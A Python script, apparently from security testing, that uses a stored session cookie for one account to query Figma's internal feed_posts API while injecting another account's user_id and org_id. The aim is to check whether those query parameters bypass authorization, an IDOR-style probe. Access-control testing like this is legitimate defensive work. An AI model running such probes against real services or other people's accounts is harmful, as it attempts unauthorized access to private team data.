# -*- coding: utf-8 -*-
"""feed 面(团队动态流) resolver 参数信任矩阵: B(无注入) 视角
核心问题: pagination_resolver/feed_posts 的 userId / org_id query 参数
是否参与授权决策 (与 fuid 同构但载体为 query 参数、攻击面为 feed)
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
A_TEAM = "1666382706663462213"
B_UID = "1667396392129259941"
B_TEAM = "1667396394890946753"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def call(label, query, cookie=BC):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": cookie}
    url = BASE + "/api/internal/livegraph/pagination_resolver/feed_posts?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} len={len(raw)} :: {raw[:600]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} :: {raw[:600]}")
        return e.code, raw


print("===== 0. 会话有效性检查 =====")
req = urllib.request.Request(BASE + "/api/user", headers={"User-Agent": UA, "Cookie": BC})
try:
    with urllib.request.urlopen(req, timeout=20) as r:
        print("api/user:", r.status, r.read().decode(errors='replace')[:200])
except urllib.error.HTTPError as e:
    print("api/user:", e.code, e.read().decode(errors='replace')[:200])

print("\n===== 1. 基线: B 自己 uid + 自己 org =====")
call("B+B", {"user_id": B_UID, "org_id": B_TEAM, "feedFilter": "ALL", "firstPageSize": 50})
call("B+B no filter", {"user_id": B_UID, "org_id": B_TEAM})

print("\n===== 2. 交叉注入矩阵 =====")
call("B uid + A org", {"user_id": B_UID, "org_id": A_TEAM, "feedFilter": "ALL"})
call("A uid + B org", {"user_id": A_UID, "org_id": B_TEAM, "feedFilter": "ALL"})
call("A uid + A org", {"user_id": A_UID, "org_id": A_TEAM, "feedFilter": "ALL"})
call("A uid only", {"user_id": A_UID, "feedFilter": "ALL"})
call("A org only", {"org_id": A_TEAM, "feedFilter": "ALL"})
call("随机 uid + A org", {"user_id": "9999999999999999999", "org_id": A_TEAM, "feedFilter": "ALL"})
